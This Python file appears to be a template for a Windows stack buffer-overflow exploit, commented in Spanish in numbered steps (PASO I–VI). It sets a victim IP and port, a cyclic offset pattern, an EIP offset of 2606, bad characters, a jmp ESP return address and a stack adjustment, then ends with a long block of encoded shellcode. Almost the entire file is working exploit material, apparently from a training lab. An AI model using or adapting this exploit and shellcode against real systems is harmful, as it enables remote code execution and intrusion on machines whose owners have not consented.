# PASO I
# ip máquina victima
rhost = ''

# puerto máquina victima
rport = 0

# timeout conexión en segundos
timeout = 10

# PASO II
# pattern
pattern = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2D'

# PASO III
# offset EIP
offsetEIP = 2606

# offset ESP
offsetESP = 2606 + 4

# tamaño máximo del relleno del padding final
buffer = 3000

# PASO IV
badchars = [0x00, 0x01, 0x0a, 0x0d] # badchars = [0x00, 0x0a, 0x0d]
badcharsSequence = bytes(c for c in range(256) if c not in badchars)

# PASO V
# dirección de la operación jmp ESP
jmpESP = 0x5F4A358F # jmpESP = 0x11223344

# PASO VI
# subir ESP en la pila (stack)
upESP = b'\x83\xec\x10'
#upESP = b'\x90' * 16

# shellcode
shellcode =  b""
shellcode += b"\xba\xfc\xd0\xb0\x72\xda\xc1\xd9\x74\x24\xf4"
shellcode += b"\x5f\x31\xc9\xb1\x52\x83\xc7\x04\x31\x57\x0e"
shellcode += b"\x03\xab\xde\x52\x87\xaf\x37\x10\x68\x4f\xc8"
shellcode += b"\x75\xe0\xaa\xf9\xb5\x96\xbf\xaa\x05\xdc\xed"
shellcode += b"\x46\xed\xb0\x05\xdc\x83\x1c\x2a\x55\x29\x7b"
shellcode += b"\x05\x66\x02\xbf\x04\xe4\x59\xec\xe6\xd5\x91"
shellcode += b"\xe1\xe7\x12\xcf\x08\xb5\xcb\x9b\xbf\x29\x7f"
shellcode += b"\xd1\x03\xc2\x33\xf7\x03\x37\x83\xf6\x22\xe6"
shellcode += b"\x9f\xa0\xe4\x09\x73\xd9\xac\x11\x90\xe4\x67"
shellcode += b"\xaa\x62\x92\x79\x7a\xbb\x5b\xd5\x43\x73\xae"
shellcode += b"\x27\x84\xb4\x51\x52\xfc\xc6\xec\x65\x3b\xb4"
shellcode += b"\x2a\xe3\xdf\x1e\xb8\x53\x3b\x9e\x6d\x05\xc8"
shellcode += b"\xac\xda\x41\x96\xb0\xdd\x86\xad\xcd\x56\x29"
shellcode += b"\x61\x44\x2c\x0e\xa5\x0c\xf6\x2f\xfc\xe8\x59"
shellcode += b"\x4f\x1e\x53\x05\xf5\x55\x7e\x52\x84\x34\x17"
shellcode += b"\x97\xa5\xc6\xe7\xbf\xbe\xb5\xd5\x60\x15\x51"
shellcode += b"\x56\xe8\xb3\xa6\x99\xc3\x04\x38\x64\xec\x74"
shellcode += b"\x11\xa3\xb8\x24\x09\x02\xc1\xae\xc9\xab\x14"
shellcode += b"\x60\x99\x03\xc7\xc1\x49\xe4\xb7\xa9\x83\xeb"
shellcode += b"\xe8\xca\xac\x21\x81\x61\x57\xa2\xa4\x75\x57"
shellcode += b"\x45\xd1\x77\x57\xae\x5e\xf1\xb1\xda\xb0\x57"
shellcode += b"\x6a\x73\x28\xf2\xe0\xe2\xb5\x28\x8d\x25\x3d"
shellcode += b"\xdf\x72\xeb\xb6\xaa\x60\x9c\x36\xe1\xda\x0b"
shellcode += b"\x48\xdf\x72\xd7\xdb\x84\x82\x9e\xc7\x12\xd5"
shellcode += b"\xf7\x36\x6b\xb3\xe5\x61\xc5\xa1\xf7\xf4\x2e"
shellcode += b"\x61\x2c\xc5\xb1\x68\xa1\x71\x96\x7a\x7f\x79"
shellcode += b"\x92\x2e\x2f\x2c\x4c\x98\x89\x86\x3e\x72\x40"
shellcode += b"\x74\xe9\x12\x15\xb6\x2a\x64\x1a\x93\xdc\x88"
shellcode += b"\xab\x4a\x99\xb7\x04\x1b\x2d\xc0\x78\xbb\xd2"
shellcode += b"\x1b\x39\xdb\x30\x89\x34\x74\xed\x58\xf5\x19"
shellcode += b"\x0e\xb7\x3a\x24\x8d\x3d\xc3\xd3\x8d\x34\xc6"
shellcode += b"\x98\x09\xa5\xba\xb1\xff\xc9\x69\xb1\xd5"